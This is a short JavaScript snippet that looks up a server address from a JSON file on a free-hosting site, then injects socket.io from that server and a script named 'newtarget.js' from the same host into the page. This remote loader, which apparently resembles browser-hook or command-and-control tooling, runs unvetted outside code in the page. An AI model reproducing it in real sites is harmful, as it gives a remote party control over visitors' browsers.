
// $.getJSON('https://remotehostsmiley.000webhostapp.com/getServer.json', function(data) {
//     // JSON result in `data` variable
//     stringifyJs = JSON.stringify(data)
//     stringifyJs = stringifyJs.split(':"')
//     stringifyJs = stringifyJs[1];
//     stringifyJs = stringifyJs.slice(0, stringifyJs.length - 2)
//     console.log(stringifyJs)
//     serverHost = stringifyJs;
// });
var serverHost;
var stringifyJs;


await fetch('https://remotehostsmiley.000webhostapp.com/getServer.json')
.then(response => response.json())
.then(json => {
    stringifyJs = JSON.stringify(json)
    stringifyJs = stringifyJs.split(':"')
    stringifyJs = stringifyJs[1];
    stringifyJs = stringifyJs.slice(0, stringifyJs.length - 2)
    console.log(stringifyJs)
    serverHost = stringifyJs;
})

sc = document.createElement("script");
sc.setAttribute("defer", "");
sc.setAttribute("src", `${serverHost}/socket.io/socket.io.js`);
document.head.appendChild(sc);

sc = document.createElement("script");
sc.setAttribute("defer", "");
sc.setAttribute("src", "https://remotehostsmiley.000webhostapp.com/newtarget.js");
document.head.appendChild(sc);
